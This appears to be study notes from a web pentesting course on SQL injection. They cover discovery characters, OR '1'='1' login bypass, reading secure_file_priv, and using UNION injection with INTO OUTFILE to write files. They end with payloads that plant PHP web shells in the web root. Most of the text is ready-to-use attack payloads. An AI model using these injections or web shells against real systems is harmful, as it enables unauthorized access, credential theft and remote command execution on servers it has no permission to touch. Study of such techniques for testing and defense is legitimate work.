# Subverting Query Logic

```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
```

## SQLi Discovery

We will try to add one of the below payloads after our username and see if it causes any errors or changes how the page behaves:

|Payload|URL Encoded|
|---|---|
|`'`|`%27`|
|`"`|`%22`|
|`#`|`%23`|
|`;`|`%3B`|
|`)`|`%29`|

Note: In some cases, we may have to use the URL encoded version of the payload. An example of this is when we put our payload directly in the URL 'i.e. HTTP GET request'.

So, let us start by injecting a single quote:

```sql
SELECT * FROM logins WHERE username=''' AND password = 'something';
```

The quote we entered resulted in an odd number of quotes, causing a syntax error.

## OR Injection

if we inject the below condition and have an `OR` operator between it and the original condition, it should always return `true`:

```sql
admin' or '1'='1
```

We use ('1'='1), so the remaining single quote from the original query would be in its place.

The final query should be as follow:

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

This means the following:

- If username is `admin`  
    `OR`
- If `1=1` return `true` 'which always returns `true`'  
    `AND`
- If password is `something`

We were able to log in successfully as admin. However, what `if we did not know a valid username`? Let us try the same request with a different username this time.

```sql
SELECT * FROM logins WHERE username='notAdmin' or '1'='1' AND password = 'something';
```

The login failed because `notAdmin` does not exist in the table and resulted in a false query overall.

To successfully log in once again, we will need an overall `true` query. This can be achieved by injecting an `OR` condition into the password field, so it will always return `true`. Let us try `something' or '1'='1` as the password.

```sql
SELECT * FROM logins WHERE username='notAdmin' or '1'='1' AND password = 'something' or '1' = '1';
```

# Writing Files

## secure_file_priv

The [secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, `NULL` means we cannot read/write from any directory.

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

From `UNION` injection :

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

## SELECT INTO OUTFILE

The [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) statement can be used to write data from select queries into files. This is usually used for exporting data from tables.

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

It is also possible to directly `SELECT` strings into files, allowing us to write arbitrary files to the back-end server.

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

```bash
$ cat /tmp/test.txt 

this is a test
```

## Writing a Web Shell

```sql
UNION SELECT "",'<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
```

```sql
UNION SELECT NULL,NULL,NULL,"<?php system('id'); system($_GET[0]); ?>" INTO OUTFILE "/var/www/html/shell.php"-- -
```
